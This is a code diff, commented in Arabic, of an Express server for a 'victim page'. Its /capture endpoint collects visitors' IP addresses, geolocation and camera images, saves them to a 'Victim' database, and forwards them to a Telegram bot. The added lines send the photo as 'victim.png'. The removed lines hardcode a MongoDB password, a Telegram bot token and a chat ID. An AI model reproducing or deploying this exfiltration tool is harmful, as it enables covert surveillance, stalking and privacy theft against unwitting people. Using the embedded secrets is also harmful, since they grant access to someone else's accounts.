@@ -1,57 +1,28 @@
-const express = require('express');
-const mongoose = require('mongoose');
-const cors = require('cors');
-const bodyParser = require('body-parser');
-const axios = require('axios');
-const path = require('path');
-
-const app = express(); // هنا تم تعريف "app" لحل المشكلة
-
-app.use(cors());
-app.use(bodyParser.json({ limit: '50mb' }));
-
-// إعدادات البوت والقاعدة الخاصة بك
-const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/myDatabase?retryWrites=true&w=majority";
-const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
-const CHAT_ID = "8351043975";
-
-mongoose.connect(MONGO_URI).then(() => console.log("✅ Database Ready")).catch(err => console.log(err));
-
-const Victim = mongoose.model('Victim', new mongoose.Schema({
-    ip: String, image: String, location: Object, date: { type: Date, default: Date.now }
-}));
-
-// تقديم صفحة الضحية
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// استقبال الصيد وإرساله للتيليجرام
+// ... الكود السابق ...
 app.post('/capture', async (req, res) => {
     try {
         const { image, location } = req.body;
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-        // إرسال البيانات للبوت فوراً
-        const mapUrl = location ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "غير متوفر";
-        const message = `🎯 صيد جديد!\n🌐 IP: ${ip}\n📍 الموقع: ${mapUrl}`;
-        
+        // إرسال الموقع الجغرافي
+        let mapUrl = location && location.lat ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الضحية رفضت الموقع";
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
-            text: message
+            text: `🎯 صيد جديد!\n🌐 IP: ${ip}\n📍 الموقع: ${mapUrl}`
         });
 
-        // حفظ في القاعدة
-        const newData = new Victim({ ip, image, location });
-        await newData.save();
-        
-        res.status(200).send("Done");
-    } catch (error) {
-        console.error(error);
-        res.status(500).send("Error");
-    }
-});
+        // إرسال الصورة مباشرة للبوت إذا وجدت
+        if (image && image.includes("base64")) {
+            const buffer = Buffer.from(image.split(",")[1], 'base64');
+            const formData = new FormData();
+            formData.append('photo', buffer, { filename: 'victim.png' });
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', `📸 صورة الضحية من IP: ${ip}`);
 
-app.listen(process.env.PORT || 3000, () => {
-    console.log("🚀 Server is running...");
+            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData, {
+                headers: formData.getHeaders()
+            });
+        }
+        res.status(200).send("Sync OK");
+    } catch (e) { res.status(500).send(e.message); }
 });
